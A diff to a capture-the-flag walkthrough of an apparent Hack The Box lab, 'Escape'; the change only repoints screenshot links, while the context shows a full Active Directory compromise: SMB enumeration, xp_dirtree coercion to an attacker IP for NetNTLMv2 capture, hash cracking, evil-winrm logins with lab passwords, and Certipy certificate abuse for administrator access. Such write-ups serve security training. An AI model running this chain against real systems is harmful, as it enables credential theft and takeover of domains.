@@ -44,7 +44,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.12.41
 ```
 
-![ping](escape_01_ping.png)
+![ping](screenshots/escape_01_ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -64,7 +64,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.12.41 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](escape_02_nmap_allports.png)
+![allports](screenshots/escape_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -72,7 +72,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](escape_03_extractports.png)
+![extractports](screenshots/escape_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -88,8 +88,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](escape_04_nmap_targeted_1.png)
-![targeted 2](escape_05_nmap_targeted_2.png)
+![targeted 1](screenshots/escape_04_nmap_targeted_1.png)
+![targeted 2](screenshots/escape_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -120,19 +120,19 @@ Enumerate SMB and guest-accessible shares:
 crackmapexec smb 10.129.12.41
 ```
 
-![cme smb](escape_06_crackmapexec_smb.png)
+![cme smb](screenshots/escape_06_crackmapexec_smb.png)
 
 ```bash
 smbclient -L //10.129.12.41 -N
 ```
 
-![smbclient list](escape_07_smbclient_list_shares.png)
+![smbclient list](screenshots/escape_07_smbclient_list_shares.png)
 
 ```bash
 smbmap -u 'guest' -p '' -H 10.129.12.41
 ```
 
-![smbmap](escape_08_smbmap_guest.png)
+![smbmap](screenshots/escape_08_smbmap_guest.png)
 
 The **`Public`** share is readable. Download **`SQL Server Procedures.pdf`**:
 
@@ -141,7 +141,7 @@ smbclient //10.129.12.41/Public -N
 # smb: \> get "SQL Server Procedures.pdf"
 ```
 
-![get pdf](escape_09_smbclient_get_pdf.png)
+![get pdf](screenshots/escape_09_smbclient_get_pdf.png)
 
 Extract text from the PDF:
 
@@ -149,7 +149,7 @@ Extract text from the PDF:
 pdftotext "SQL Server Procedures.pdf" -
 ```
 
-![pdftotext](escape_10_pdftotext_pdf.png)
+![pdftotext](screenshots/escape_10_pdftotext_pdf.png)
 
 The **bonus** section of the PDF provides SQL authentication credentials: **`PublicUser`** / **`GuestUserCantWrite1`**.
 
@@ -164,11 +164,11 @@ Connect using **SQL Server authentication** (not Windows auth):
 impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.129.12.41'
 ```
 
-![mssql PublicUser](escape_11_mssqlclient_publicuser.png)
+![mssql PublicUser](screenshots/escape_11_mssqlclient_publicuser.png)
 
 Confirm limited privileges (`fn_my_permissions` â€” not sysadmin):
 
-![fn_my_permissions](escape_12_sql_fn_my_permissions.png)
+![fn_my_permissions](screenshots/escape_12_sql_fn_my_permissions.png)
 
 ### 3.2 NetNTLMv2 Capture with `xp_dirtree`
 
@@ -178,9 +178,9 @@ The **`xp_dirtree`** extended procedure forces the SQL service account to authen
 EXEC master..xp_dirtree '\\<TUN0_IP>\test', 1, 1;
 ```
 
-![xp_dirtree](escape_14_mssql_xp_dirtree.png)
+![xp_dirtree](screenshots/escape_14_mssql_xp_dirtree.png)
 
-![Responder hash](escape_15_responder_ntlmv2_sql_svc.png)
+![Responder hash](screenshots/escape_15_responder_ntlmv2_sql_svc.png)
 
 ### 3.3 Cracking and Validation
 
@@ -191,8 +191,8 @@ hashcat -m 5600 hash_sql_svc /usr/share/wordlists/rockyou.txt
 john --format=netntlmv2 hash_sql_svc --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![hashcat](escape_16_hashcat_sql_svc.png)
-![john](escape_17_john_sql_svc.png)
+![hashcat](screenshots/escape_16_hashcat_sql_svc.png)
+![john](screenshots/escape_17_john_sql_svc.png)
 
 **Recovered:** `sequel\sql_svc` / `REGGIE1234ronnie`
 
@@ -204,8 +204,8 @@ crackmapexec winrm 10.129.12.41 -u sql_svc -p 'REGGIE1234ronnie'
 evil-winrm -i 10.129.12.41 -u sql_svc -p 'REGGIE1234ronnie'
 ```
 
-![cme validate](escape_18_crackmapexec_sql_svc.png)
-![evil-winrm sql_svc](escape_19_evil_winrm_sql_svc.png)
+![cme validate](screenshots/escape_18_crackmapexec_sql_svc.png)
+![evil-winrm sql_svc](screenshots/escape_19_evil_winrm_sql_svc.png)
 
 ---
 ### 3.4 ERRORLOG credential leak and user flag
@@ -216,7 +216,7 @@ On the **DC** as `sql_svc`, read the SQL install log backup for failed login ent
 type C:\SQLServer\Logs\ERRORLOG.BAK
 ```
 
-![errorlog](escape_21_errorlog_bak.png)
+![errorlog](screenshots/escape_21_errorlog_bak.png)
 
 Failed login entries leak **`ryan.cooper`** / **`NuclearMosquito3`**.
 
@@ -228,7 +228,7 @@ evil-winrm -i 10.129.12.41 -u 'ryan.cooper' -p 'NuclearMosquito3'
 type C:\Users\Ryan.Cooper\Desktop\user.txt
 ```
 
-![user.txt](escape_23_user_txt.png)
+![user.txt](screenshots/escape_23_user_txt.png)
 
 ðŸ **User flag obtained**
 
@@ -246,7 +246,7 @@ certipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' \
   -dc-ip 10.129.12.41 -dns-tcp -stdout
 ```
 
-![certipy find](escape_24_certipy_find.png)
+![certipy find](screenshots/escape_24_certipy_find.png)
 
 ```bash
 certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' \
@@ -255,13 +255,13 @@ certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' \
   -upn 'administrator@sequel.htb'
 ```
 
-![certipy req](escape_25_certipy_req_userauthentication.png)
+![certipy req](screenshots/escape_25_certipy_req_userauthentication.png)
 
 ```bash
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.12.41 -dns-tcp
 ```
 
-![certipy auth](escape_26_certipy_auth_administrator.png)
+![certipy auth](screenshots/escape_26_certipy_auth_administrator.png)
 
 Use the **NT hash** printed by Certipy with **Evil-WinRM**:
 
@@ -274,7 +274,7 @@ whoami
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![root](escape_28_root_txt.png)
+![root](screenshots/escape_28_root_txt.png)
 
 ðŸ **Root flag obtained**
 
